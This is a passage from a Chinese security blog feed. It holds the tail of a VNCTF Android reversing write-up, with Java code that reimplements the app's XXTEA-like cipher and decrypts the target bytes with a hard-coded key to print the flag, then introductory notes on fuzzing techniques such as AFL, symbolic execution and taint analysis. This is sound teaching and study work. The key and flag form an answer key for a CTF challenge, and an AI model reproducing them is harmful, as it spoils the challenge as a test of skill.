class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">vnctfcm1apk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] bencrypt(<span class="keyword">byte</span>[] input, <span class="keyword">byte</span>[] keys) &#123;</span><br><span class="line">        <span class="keyword">return</span> input.length == <span class="number">0</span> ? input : toByteArray(encrypt(toIntArray(input, <span class="keyword">false</span>), toIntArray(keys, <span class="keyword">false</span>)), <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] encrypt(<span class="keyword">int</span>[] input, <span class="keyword">int</span>[] keys) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;input: &quot;</span> + Arrays.toString(input));</span><br><span class="line">        System.out.println(<span class="string">&quot;keys : &quot;</span> + Arrays.toString(keys));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rounds = <span class="number">52</span> / input.length + <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">int</span> rnd_s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> prev_int = input[input.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            rnd_s += -<span class="number">1640531527</span>;</span><br><span class="line">            <span class="keyword">int</span> rnd_e = rnd_s &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;[rnd_e:&quot;</span> + rnd_e + <span class="string">&quot;, rnd_s:&quot;</span> + rnd_s + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> ind;</span><br><span class="line">            <span class="keyword">for</span>(ind = <span class="number">0</span>; ind &lt; input.length - <span class="number">1</span>; ++ind) &#123;</span><br><span class="line">                <span class="keyword">int</span> ind_chr = input[ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ input[ind + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) + (input[ind + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ input[ind + <span class="number">1</span>]) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">                input[ind] = ind_chr;</span><br><span class="line">                prev_int = ind_chr;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> next_int = input[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> last_ind = input.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> lc = input[last_ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">            input[last_ind] = lc;</span><br><span class="line">            prev_int = lc;</span><br><span class="line">            --rounds;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.print(<span class="string">&quot;try encrypt: [&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">byte</span> a:toByteArray(input, <span class="keyword">false</span>))&#123;</span><br><span class="line">            System.out.print(a + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] decrypt(<span class="keyword">int</span>[] aim, <span class="keyword">int</span>[] keys)&#123;</span><br><span class="line">        <span class="keyword">int</span>[] preaim = <span class="keyword">new</span> <span class="keyword">int</span>[aim.length];</span><br><span class="line">        <span class="keyword">int</span>[] rnd_s = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">1640531527</span>,<span class="number">1013904242</span>,-<span class="number">626627285</span>,<span class="number">2027808484</span>,<span class="number">387276957</span>,-<span class="number">1253254570</span>,<span class="number">1401181199</span>,-<span class="number">239350328</span>,-<span class="number">1879881855</span>,<span class="number">774553914</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] rnd_e = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> rnd=<span class="number">9</span>;rnd&gt;=<span class="number">0</span>;rnd--)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> ind = aim.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> last_ind = aim.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> prev_int = aim[last_ind-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> next_int = aim[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> lc = aim[last_ind];</span><br><span class="line"></span><br><span class="line">            preaim[last_ind] = (lc - ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s[rnd] ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e[rnd]] ^ prev_int))  );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(ind = aim.length - <span class="number">1</span> -<span class="number">1</span>; ind&gt;=<span class="number">0</span>; ind--)&#123;</span><br><span class="line">                <span class="keyword">if</span>(ind==<span class="number">0</span>) prev_int = preaim[aim.length-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> prev_int = aim[ind-<span class="number">1</span>];</span><br><span class="line">                next_int = preaim[ind+<span class="number">1</span>];</span><br><span class="line">                preaim[ind] = (aim[ind] - ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s[rnd] ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e[rnd]] ^ prev_int))  );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            aim = preaim;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// System.out.println(&quot;ans : &quot; + Arrays.toString(toByteArray(aim)));</span></span><br><span class="line">        System.out.print(<span class="string">&quot;try decrypt: [&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">byte</span> a:toByteArray(aim, <span class="keyword">false</span>))&#123;</span><br><span class="line">            System.out.print(a + <span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;try flag: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">byte</span> a:toByteArray(aim, <span class="keyword">false</span>))&#123;</span><br><span class="line">            System.out.print((<span class="keyword">char</span>)a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> aim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argc)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rounds = <span class="number">7</span>; <span class="comment">// 52 / 44 + 6</span></span><br><span class="line">        <span class="keyword">byte</span>[] aim_byte=<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">68</span>, <span class="number">39</span>, -<span class="number">92</span>, <span class="number">108</span>, -<span class="number">82</span>, -<span class="number">18</span>, <span class="number">72</span>, -<span class="number">55</span>, <span class="number">74</span>, -<span class="number">56</span>, <span class="number">38</span>, <span class="number">11</span>, <span class="number">60</span>, <span class="number">84</span>, <span class="number">97</span>, -<span class="number">40</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">99</span>, -<span class="number">82</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">0x2F</span>, -<span class="number">71</span>, -<span class="number">58</span>, -<span class="number">57</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">38</span>, -<span class="number">44</span>, -<span class="number">39</span>, -<span class="number">60</span>, <span class="number">0x71</span>, -<span class="number">2</span>, <span class="number">92</span>, -<span class="number">75</span>, <span class="number">0x76</span>, -<span class="number">77</span>, <span class="number">50</span>, (<span class="keyword">byte</span>)<span class="number">0x87</span>, <span class="number">43</span>, <span class="number">0x20</span>, -<span class="number">106</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] aim_int =<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0b1101100101001000010011101000100</span>,<span class="number">0b11001001010010001110111010101110</span>,<span class="number">0b1011001001101100100001001010</span>,<span class="number">0b11011000011000010101010000111100</span>,<span class="number">0b10101110011000110100011101010111</span>,<span class="number">0b10111001001011110110100001111000</span>,<span class="number">0b100001000000001100011111000110</span>,<span class="number">0b11011001110101000010011000101010</span>,<span class="number">0b1011100111111100111000111000100</span>,<span class="number">0b110010101100110111011010110101</span>,<span class="number">0b10010110001000000010101110000111</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] try_byte=<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">86</span>,<span class="number">78</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">57</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">101</span>,<span class="number">55</span>,<span class="number">54</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">45</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">97</span>,<span class="number">53</span>,<span class="number">99</span>,<span class="number">50</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">102</span>,<span class="number">52</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">98</span>,<span class="number">97</span>,<span class="number">125</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        decrypt( toIntArray(aim_byte, <span class="keyword">false</span>), toIntArray(<span class="string">&quot;H4pPY_VNCTF!!OvO&quot;</span>.getBytes(), <span class="keyword">false</span>) );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] ens = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">11</span>];</span><br><span class="line">        ens = encrypt( toIntArray(try_byte, <span class="keyword">false</span>) , toIntArray(<span class="string">&quot;H4pPY_VNCTF!!OvO&quot;</span>.getBytes(), <span class="keyword">false</span>) );</span><br><span class="line">        System.out.println(<span class="string">&quot;encoded msg length = &quot;</span> + toByteArray(ens, <span class="keyword">false</span>).length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] toIntArray(<span class="keyword">byte</span>[] arg7, <span class="keyword">boolean</span> arg8) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result;</span><br><span class="line">        <span class="keyword">int</span> v0 = (arg7.length &amp; <span class="number">3</span>) == <span class="number">0</span> ? arg7.length &gt;&gt;&gt; <span class="number">2</span> : (arg7.length &gt;&gt;&gt; <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// System.out.println(&quot;IntArray length:&quot; + v0);</span></span><br><span class="line">        <span class="keyword">if</span>(arg8) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0 + <span class="number">1</span>];</span><br><span class="line">            result[v0] = arg7.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; arg7.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> v3 = i &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">            result[v3] |= (arg7[i] &amp; <span class="number">0xFF</span>) &lt;&lt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(<span class="keyword">int</span>[] arg5, <span class="keyword">boolean</span> arg6) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = arg5.length &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg6) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = arg5[arg5.length - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(m &gt; n) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            n = m;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// System.out.println(&quot;ByteArray length:&quot; + n);</span></span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[n];</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            result[i] = (<span class="keyword">byte</span>)(arg5[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可惜时不我Die</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220212205246.png" alt="image-20220212205239215"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;只有一个Android，我也就只做了个Android，题目链接: &lt;a href=&quot;https://buuoj.cn/match/matches/81/challenges&quot;&gt;https://buuoj.cn/match/matches/81/challenges&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Fuzz入门</title>
    <link href="http://slient2009.github.io/2021/12/10/Fuzz-Basic/"/>
    <id>http://slient2009.github.io/2021/12/10/Fuzz-Basic/</id>
    <published>2021-12-10T05:00:00.000Z</published>
    <updated>2022-01-09T06:58:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>先以一篇综述学习Fuzz的基本流程<br>《模糊测试技术综述》 任泽众 《计算机研究与发展》<br>本文总结了Fuzz工作流程，并将其作为行文脉络，详细介绍了各个阶段中的相关技术。<br>重点介绍了AFL及其改进研究，简要介绍了Fuzz的多种应用场景，以及反Fuzz和Fuzz+ML等新的研究方向。</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211209143254411.png" alt="image-20211209143254411"></p><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><blockquote><p>搜集目标相关信息（输入格式、内部结构），并制订模糊测试的策略，为监控目标在测试中的运行状态做必要的准备。<br>通常依赖于插桩、符号执行以及五点分析这类程序分析技术。</p><p>挑战：使用什么样的程序分析技术，对目标内部达到什么程度的了解。</p></blockquote><h2 id="分析技术与信息获取"><a href="#分析技术与信息获取" class="headerlink" title="分析技术与信息获取"></a>分析技术与信息获取</h2><h3 id="插桩"><a href="#插桩" class="headerlink" title="插桩"></a>插桩</h3><p>向目标代码中的合适位置添加预设好的代码，获取程序的静态或动态执行信息，如程序的抽象语法树、覆盖率和函数内变量取值。</p><h4 id="静态插桩"><a href="#静态插桩" class="headerlink" title="静态插桩"></a>静态插桩</h4><p>在源码或者中间代码的编译过程中进行插桩</p><p>通过GCC在汇编语言上插桩，通过LLVM在生成的中间语言上插桩。</p><p>节省时间、速度快，依赖源代码</p><h4 id="动态插桩"><a href="#动态插桩" class="headerlink" title="动态插桩"></a>动态插桩</h4><p>利用QEMU等模拟技术进行插桩，获取程序的运行时信息。</p><p>资源开销大。</p><h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p>将程序行为的推理归结为逻辑领域的推理，通过构建一个表示程序执行的逻辑公式，可以同时推断一个程序在不同输入上的行为。该方法可以是模糊测试获得较好的覆盖率，并且可以深入到程序深处探测漏洞。</p><h4 id="静态符号执行"><a href="#静态符号执行" class="headerlink" title="静态符号执行"></a>静态符号执行</h4><p>通常会因为循环和递归的存在陷入到路径爆炸中，还会因为hash之类操作的存在导致约束求解失败。</p><h4 id="动态符号执行"><a href="#动态符号执行" class="headerlink" title="动态符号执行"></a>动态符号执行</h4><p>针对路径爆炸和非线性约束求解失败的问题，更多使用的是动态符号执行。</p><p>动态符号执行通过对程序进行<strong>实际执行</strong>和<strong>符号化执行</strong>，维护程序的<strong>实际状态</strong>和<strong>符号化状态</strong>，通过<strong>将难以求解的约束替换为实际值</strong>，缓解静态符号执行的问题，并按照深度优先的搜索策略对目标程序进行了探索。</p><p><strong>问题</strong>：<br>由于程序分支的存在，路径爆炸的问题仍然存在。程序越复杂，路径爆炸问题越严重。一种解决办法是使用启发式搜索优先探索重要的路径。<br>使用实际值替换方法解决了部分静态符号执行无法解决的约束求解问题，但是可能会丢失部分路径，造成探索结果不完整。<br>所有的符号执行技术都受限于约束求解方法的能力，比如如何处理取余操作这类的非线性约束，仍然是符号执行面临的挑战。</p><h3 id="污点分析"><a href="#污点分析" class="headerlink" title="污点分析"></a>污点分析</h3><p>五点分析技术会观测程序中哪些数据受到预置污染源（如输入）的污染，目的是跟踪污染源和汇聚点（如敏感数据）之间信息流。</p><p>将污点分析应用到模糊测试中，并降低其资源消耗是最近的重要研究方向。</p><h4 id="静态污点分析"><a href="#静态污点分析" class="headerlink" title="静态污点分析"></a>静态污点分析</h4><p>获取程序控制流图、抽象语法树等信息，依据数据流以及依赖关系精选污点分析。<br>静态污点分析也会有路径爆炸的问题，而简化后的污点分析可能有过度污染的问题。</p><h4 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h4><p>在程序实际执行的过程中，利用程序的动态执行信息进行污点分析。<br>动态污点资源代价大，分析可信度更高，但是检测结果是否全面取决于污点分析对程序的覆盖情况。</p><h3 id="其他程序分析技术"><a href="#其他程序分析技术" class="headerlink" title="其他程序分析技术"></a>其他程序分析技术</h3><p>面向不同场景的模糊测试研究</p><p>IoT、内核、Android、USB、蓝牙协议、算法复杂度……</p><h2 id="模糊测试在预处理阶段的类型划分"><a href="#模糊测试在预处理阶段的类型划分" class="headerlink" title="模糊测试在预处理阶段的类型划分"></a>模糊测试在预处理阶段的类型划分</h2><h3 id="黑盒模糊测试"><a href="#黑盒模糊测试" class="headerlink" title="黑盒模糊测试"></a>黑盒模糊测试</h3><p>又称输入输出驱动的测试、数据驱动的测试，不能对目标内部状态以及结构进行分析、只能获得输入数据等与内部无关的信息。<br>无法跟踪目标内部的执行状态，只能通过检测目标的输出数据，对目标的状态进行判断。<br>适用于输入数据高度结构化的目标，以及复杂且难以分析的目标，在网络、文件、内核以及IoT模糊测试上都是重要应用。</p><p><strong>意义</strong>：不是所有目标都是开源的；黑盒测试工具设计简单，开发和检测速度快。</p><p><strong>问题</strong>：由于没有目标内部信息，会生成大量无效输入，导致测试的覆盖率相对偏低，检测生成漏洞的能力有限。</p><h3 id="白盒模糊测试"><a href="#白盒模糊测试" class="headerlink" title="白盒模糊测试"></a>白盒模糊测试</h3><p>可以获得充足的目标内部信息，通常采用符号执行的方法。<br>可以生成高质量输入数据，在覆盖率以及程序的深层漏洞检测上有更好的表现。<br>但是在实践中，仍然有路径爆炸的问题，同时伴有大量资源消耗，影响效率。</p><p>在不影响模糊测试效率的前提下，如何获取详细的目标内部信息，是一个重要的研究方向。<br><strong>Driller</strong>: 使用AFL检索程序浅层漏洞，当AFL随机生成的输入无法深入探测程序时，转而进行符号执行。<br><strong>QSYM</strong>： 使用动态二进制转换，将符号执行与本地执行紧密集成，实现了更为细粒度的指令集符号执行，解决了路径约束缓慢、甚至无法形成正确的约束的问题。<br><strong>DigFuzz</strong>: 如何快速而准确地判断哪些程序的路径应该是符号执行技术，是一个混合模糊测试器的优化问题。DigFuzz量化了处理每条路径的困难程度，将难以通过随机种子到达的路径转而交给符号执行，较好地优化了在模糊测试中使用符号执行的策略。</p><h3 id="灰盒模糊测试"><a href="#灰盒模糊测试" class="headerlink" title="灰盒模糊测试"></a>灰盒模糊测试</h3><p>灰盒模糊测试是白盒模糊测试的变体，只能获得部分程序内部信息。</p><p><strong>思想</strong>：对程序内部进行细致而全面的分析，并不是获取良好测试结果的必要条件，仅依靠有限的与测试目标相关的信息，在配合良好的测试策略，仍然可以获得令人满意的测试结果。</p><p>灰盒模糊测试中，最重要的研究成果是AFL。<br>AFL通过在编译时插桩，搜集模糊测试中边缘覆盖率信息；使用进化算法将边覆盖率作为算法的适应函数，使得测试沿着边覆盖率增大的方向进行，极大改善了模糊测试效果。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>黑盒测试：轻量级测试工具，设计简单，测试速度快，但是检测效果不理想，难以进行深层探测。适用于难以进行内部探测的目标，以及开发和测试时间有限的场景。<br>白盒测试：重量级测试工具，更加智能，效果更好，能较好探测深层漏洞，但是开发和测试工作都跟为复杂且耗时。适用于可以分析内部结构的目标，以及对深层漏洞有较高检测要求的任务。<br>灰盒测试：没有明确的定位。从数据的角度，其“灰度”取决于利用的内部信息的多少；从设计的角度，体现了灰盒测试在检测能力与检测代价之间的平衡，达到最佳的检测效果。</p><h2 id="AFL及其改进"><a href="#AFL及其改进" class="headerlink" title="AFL及其改进"></a>AFL及其改进</h2><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211209205542644.png" alt="image-20211209205542644" style="zoom:67%;" /><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20211209205622938.png" alt="image-20211209205622938" style="zoom:67%;" /><h1 id="实际测试环节"><a href="#实际测试环节" class="headerlink" title="实际测试环节"></a>实际测试环节</h1><h2 id="输入构造"><a href="#输入构造" class="headerlink" title="输入构造"></a>输入构造</h2><blockquote><p>首先获取一定数量的种子，随后确定种子的能量分配策略、种子的优先级以及种子的突变策略，最后根据这些信息获取大量的输入数据。</p></blockquote><p><strong>挑战</strong>：在尽量满足语法语义检查的情况下，短时间生成大量的输入，用以对目标做全面而深入的分析。<br>目前普遍的方法是：得到一个数据集S(Seed),然后根据S按照一定的策略进行一定册数的便宜，获得大量新数据I(Input)，最后将I输入到被测试对象中进行测试。</p><p>为了获得足量的高质量输入数据，需要经过种子获取、种子筛选、种子突变三个阶段。</p><h3 id="种子获取"><a href="#种子获取" class="headerlink" title="种子获取"></a>种子获取</h3><p>直接使用准备好的高质量数据集、通过模型生成、按照策略从执行过的数据中选取。</p><p><strong>挑战与研究方向</strong>：<br>无目标语言的语法时，如何生成有效数据；<br>面向特定的场景和目标，要有针对性的生成方法；（FANS for Android）<br>直接生成模糊测试模型；<br>按照策略从执行过的输入数据中选取作为种子；（AFL的进化算法及其改进）</p><h3 id="种子筛选"><a href="#种子筛选" class="headerlink" title="种子筛选"></a>种子筛选</h3><h4 id="种子的能量分配"><a href="#种子的能量分配" class="headerlink" title="种子的能量分配"></a>种子的能量分配</h4><p>对种子池中的备选种子划分权重，以确定每个种子要用来生成多少输入，也即一个种子的能量。</p><p>在AFL中，没有考虑到程序不同执行路径频率上的差异，造成种子能量分配不合理。<br>具体来说，模糊测试进行一段时间后，部分难以到达的路径只有少数种子能够到达而执行频率过低，这些种子显然需要更多的能量。AFL在这方面的缺陷，导致低频路径上的漏洞需要更多的时间才会被模糊测试出来。</p><p>改进方法：<br>引入马尔科夫链，使得更倾向于访问低频区域。（AFLFast）<br>引入多臂老虎机模型，使用基于平均损耗的自适应能量分配策略，有效降低能量损耗，在有限时间内实现了覆盖率最大化。（EcoFuzz）<br>使用基于模拟退火的能量调度方法，逐渐将能量分配到距离目标更近的种子上，实现对目标程序给定位置的模糊测试。在探测给定目标程序上取得了更好的效果，但是可能遗漏潜在的漏洞。（AFLGo）<br>为克服这个问题，Hawkeye使用静态分析技术，全面收集与目标程序位置相关的调用图、函数以及基本块层面的距离信息；再使用与AFLGo相同的基本块路径距离和覆盖函数相似度这两个指标，指定能量分配策略。对应覆盖函数相似度越大、基本块路径越小的种子将会被分配到更大的能量，产生更多的测试数据。（Hawkeye）</p><p>AFLFast的能量分配策略不能提高模糊测试能力极限，而是缩短到达极限的时间。<br>AFLGo和Hawkeye的能量分配策略是为了引导模糊测试的方向，而不能提高覆盖率。</p><h4 id="种子的优先级"><a href="#种子的优先级" class="headerlink" 